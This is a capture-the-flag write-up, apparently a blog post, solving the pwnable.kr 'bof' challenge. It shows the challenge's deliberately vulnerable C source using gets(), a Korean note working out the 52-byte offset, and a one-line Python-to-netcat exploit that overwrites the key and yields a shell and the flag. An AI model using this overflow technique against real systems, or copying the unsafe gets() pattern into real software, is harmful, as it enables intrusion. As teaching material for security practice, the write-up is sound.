---
title : Pwnable.kr - bof
categories : [Wargame, Pwnable.kr]
tags : [Buffer Overflow]
---

## bof
```
Nana told me that buffer overflow is 
one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

## Solution
```
입력을 ebp-0x2c(44) 부터 받음. 비교는 ebp+0x8에서 함. 
따라서 52만큼 입력해주고 나머지 4바이트에는 cafebabe값을 넣어주면 될 듯.
```
```linux
~$ (python -c 'print "A"*52+"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
id
uid=1008(bof) gid=1008(bof) groups=1008(bof)
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
```
